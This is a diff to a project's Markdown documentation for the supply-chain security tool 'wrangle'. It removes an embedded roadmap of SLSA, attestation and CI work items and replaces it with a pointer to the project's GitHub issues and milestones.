-- [ ] Go build type follow-ups: validation-only sub-shape ([#239](https://github.com/TomHennen/wrangle/issues/239)), PR-build cost knob ([#245](https://github.com/TomHennen/wrangle/issues/245)), `govulncheck-version` input ([#246](https://github.com/TomHennen/wrangle/issues/246)), Go workflow reliability ([#254](https://github.com/TomHennen/wrangle/issues/254)), cgo + multi-arch goreleaser ([#259](https://github.com/TomHennen/wrangle/issues/259))
-- [ ] [Ampel](https://github.com/carabiner-dev/ampel) integration — policy
-      verification layer that evaluates attestations against CEL-based
-      policies and produces Verification Summary Attestations. Scoping in
-      [`docs/ampel_research.md`](./ampel_research.md) and
-      [#247](https://github.com/TomHennen/wrangle/issues/247); each phase
-      lands as a PR referencing #247. Known limitation: Phases 1–7 keep the build
-      workflow and the verifier in the same GitHub Actions job, which is
-      not strictly SLSA L3-compliant for builder/verifier separation. A
-      separate verifier service (Option C in the scoping doc) is a
-      post-v1.0 work item.
-- [ ] Adopter-side `verify-artifact` action — closes the runner-isolation gap between wrangle's `verify` job and the adopter's publish job (today each download is independent, so the publish job has no machine-checked guarantee its bytes match the attestation). Verifies whatever the build produced (SLSA provenance or VSA) — not tied to Ampel. Downstream-consumer verification is covered by upstream `slsa-verifier` plus a docs page, not a wrapper. Tracking: [#198](https://github.com/TomHennen/wrangle/issues/198) (to be rescoped to adopter-side surface only).
-- [ ] Bundle wrangle attestations into a single in-toto JSONL across all build types (replacing per-build `python-<shortname>.intoto.jsonl` etc.). Tracking: [#181](https://github.com/TomHennen/wrangle/issues/181)
-- [ ] Action-pattern source-scan tools must fail closed when the underlying tool errors (currently fail open). Tracking: [#222](https://github.com/TomHennen/wrangle/issues/222)
-- [ ] Fix wrangle's own SLSA Source Track integration (prerequisite). Tracking: [#174](https://github.com/TomHennen/wrangle/issues/174)
-- [ ] Help adopters adopt the SLSA source track in their repos via `check_source_change.yml`. Tracking: [#201](https://github.com/TomHennen/wrangle/issues/201)
-
-**Deferred from v0.2** (candidates for v0.3+):
-
-- Profile system and `wrangle init` — see theme paragraph above. Tracking: [#265](https://github.com/TomHennen/wrangle/issues/265)
-- Lightweight adapter sandboxing (bubblewrap/firejail on Linux) — significant design surface; own release. Tracking: [#267](https://github.com/TomHennen/wrangle/issues/267)
-- Additional source tools (Semgrep, Trivy) — additive, not architectural. Tracking: [#268](https://github.com/TomHennen/wrangle/issues/268)
-- `tools.lock` manifest — single file listing all tool versions/URLs/checksums per platform. Marginal value at current tool count (small fixed set, infrequent bumps, atomic per-`install.sh` checksums already work). Tracking: [#264](https://github.com/TomHennen/wrangle/issues/264)
-- Per-tool configuration — prefer native config files over flat passthrough inputs. Tracking: [#221](https://github.com/TomHennen/wrangle/issues/221)
-- Test integration as a profile-level concept — each build type already runs tests inside its own action
-- npm/pnpm/yarn workspaces ([#208](https://github.com/TomHennen/wrangle/issues/208)) — own track
-
-### v1.0.0 — OpenSSF ready
-
-- [ ] OpenSSF contribution proposal
-- [ ] Stable adapter API with versioning guarantees
-- [ ] Multi-CI support (GitLab, etc.)
-- [ ] Full lifecycle coverage for all major project types
+Release scope and forward-looking work are tracked in GitHub
+[issues](https://github.com/TomHennen/wrangle/issues) and
+[milestones](https://github.com/TomHennen/wrangle/milestones), which stay current
+in a way a hand-maintained list in this file did not. (The previous embedded
+roadmap had drifted — e.g. listing build types as "Future" that had already
+shipped.)
